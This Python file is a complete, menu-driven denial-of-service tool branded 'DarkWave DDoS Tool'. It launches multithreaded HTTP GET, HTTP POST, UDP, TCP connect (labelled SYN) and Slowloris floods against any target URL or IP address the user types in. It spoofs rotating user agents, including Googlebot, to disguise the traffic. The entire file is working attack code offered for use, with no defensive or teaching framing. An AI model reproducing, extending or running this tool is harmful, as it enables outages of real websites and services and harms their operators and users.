import threading
import requests
import random
import time
import socket
import sys

# রঙিন আউটপুটের জন্য ANSI কোড
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

stop_attack = False  # global flag to stop threads

def info(msg):
    print(f"{CYAN}[i] {BOLD}{msg}{RESET}")

def success(msg):
    print(f"{GREEN}[✔] {msg}{RESET}")

def warning(msg):
    print(f"{YELLOW}[!] {msg}{RESET}")

def error(msg):
    print(f"{RED}[✘] {msg}{RESET}")

def banner():
    print(f"""{BOLD}{RED}
╔════════════════════════════════════════════╗
║          🔥 DarkWave DDoS Tool v2.0 🔥        ║
║               by CNSA                         ║
╚════════════════════════════════════════════╝
{RESET}""")

def http_flood(target_url, duration):
    global stop_attack
    info(f"Starting HTTP Flood on {target_url} for {duration} seconds")
    end_time = time.time() + duration
    while time.time() < end_time and not stop_attack:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        try:
            r = requests.get(target_url, headers=headers, timeout=5)
            success(f"[HTTP] Request sent! Status: {r.status_code}")
        except Exception:
            error("[HTTP] Request failed!")

def http_post_flood(target_url, duration):
    global stop_attack
    info(f"Starting HTTP POST Flood on {target_url} for {duration} seconds")
    end_time = time.time() + duration
    data = {"username":"admin","password":"password123"}  # Example dummy data
    while time.time() < end_time and not stop_attack:
        headers = {"User-Agent": random.choice(USER_AGENTS), "Content-Type": "application/x-www-form-urlencoded"}
        try:
            r = requests.post(target_url, data=data, headers=headers, timeout=5)
            success(f"[HTTP POST] Request sent! Status: {r.status_code}")
        except Exception:
            error("[HTTP POST] Request failed!")

def udp_flood(target_ip, target_port, duration):
    global stop_attack
    info(f"Starting UDP Flood on {target_ip}:{target_port} for {duration} seconds")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time and not stop_attack:
        try:
            sock.sendto(packet, (target_ip, target_port))
            success(f"[UDP] Packet sent to {target_ip}:{target_port}")
        except Exception:
            error("[UDP] Packet sending failed!")

def tcp_syn_flood(target_ip, target_port, duration):
    global stop_attack
    info(f"Starting TCP SYN Flood on {target_ip}:{target_port} for {duration} seconds")
    end_time = time.time() + duration
    while time.time() < end_time and not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target_ip, target_port))
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
            success(f"[TCP SYN] Connection attempt sent to {target_ip}:{target_port}")
        except Exception:
            error("[TCP SYN] Connection attempt failed!")

def slowloris_flood(target_ip, target_port, duration):
    global stop_attack
    info(f"Starting Slowloris Flood on {target_ip}:{target_port} for {duration} seconds")
    end_time = time.time() + duration
    while time.time() < end_time and not stop_attack:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"User-Agent: " + random.choice(USER_AGENTS).encode() + b"\r\n")
            sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
            # ধারাবাহিকভাবে হেডার পাঠানো হবে, সংযোগ খোলা রাখার জন্য
            for _ in range(100):
                sock.send(b"X-a: b\r\n")
                time.sleep(0.1)
            sock.close()
            success(f"[Slowloris] Partial headers sent to {target_ip}:{target_port}")
        except Exception:
            error("[Slowloris] Connection failed or dropped!")

def run_threads(target, attack_type, duration, threads, port=None):
    global stop_attack
    stop_attack = False
    thread_list = []

    for _ in range(threads):
        if attack_type == "http":
            t = threading.Thread(target=http_flood, args=(target, duration))
        elif attack_type == "http_post":
            t = threading.Thread(target=http_post_flood, args=(target, duration))
        elif attack_type == "udp":
            if port is None:
                error("Port is required for UDP flood!")
                return
            t = threading.Thread(target=udp_flood, args=(target, port, duration))
        elif attack_type == "tcp_syn":
            if port is None:
                error("Port is required for TCP SYN flood!")
                return
            t = threading.Thread(target=tcp_syn_flood, args=(target, port, duration))
        elif attack_type == "slowloris":
            if port is None:
                error("Port is required for Slowloris flood!")
                return
            t = threading.Thread(target=slowloris_flood, args=(target, port, duration))
        else:
            error(f"Unknown attack type: {attack_type}")
            return
        t.daemon = True
        t.start()
        thread_list.append(t)

    try:
        while any(t.is_alive() for t in thread_list):
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_attack = True
        warning("Attack stopped by user.")
        sys.exit()

def main():
    banner()
    print(f"{BOLD}Select attack type:{RESET}")
    print("1) HTTP Flood (GET requests)")
    print("2) HTTP POST Flood")
    print("3) UDP Flood")
    print("4) TCP SYN Flood")
    print("5) Slowloris Flood")
    choice = input("Enter choice (1-5): ").strip()

    if choice == "1":
        attack_type = "http"
        target = input("Enter target URL (e.g. https://example.com): ").strip()
        port = None
    elif choice == "2":
        attack_type = "http_post"
        target = input("Enter target URL (e.g. https://example.com): ").strip()
        port = None
    elif choice == "3":
        attack_type = "udp"
        target = input("Enter target IP address: ").strip()
        port = input("Enter target port (e.g. 80): ").strip()
        if not port.isdigit():
            error("Invalid port!")
            return
        port = int(port)
    elif choice == "4":
        attack_type = "tcp_syn"
        target = input("Enter target IP address: ").strip()
        port = input("Enter target port (e.g. 80): ").strip()
        if not port.isdigit():
            error("Invalid port!")
            return
        port = int(port)
    elif choice == "5":
        attack_type = "slowloris"
        target = input("Enter target IP address: ").strip()
        port = input("Enter target port (e.g. 80): ").strip()
        if not port.isdigit():
            error("Invalid port!")
            return
        port = int(port)
    else:
        error("Invalid choice! Exiting.")
        return

    duration = input("Enter attack duration in seconds (e.g. 60): ").strip()
    if not duration.isdigit():
        error("Invalid duration! Exiting.")
        return
    duration = int(duration)

    threads = input("Enter number of threads (e.g. 100): ").strip()
    if not threads.isdigit():
        error("Invalid threads! Exiting.")
        return
    threads = int(threads)

    warning(f"Starting {attack_type.upper()} attack on {target} for {duration}s with {threads} threads...")
    run_threads(target, attack_type, duration, threads, port)

if __name__ == "__main__":
    main()
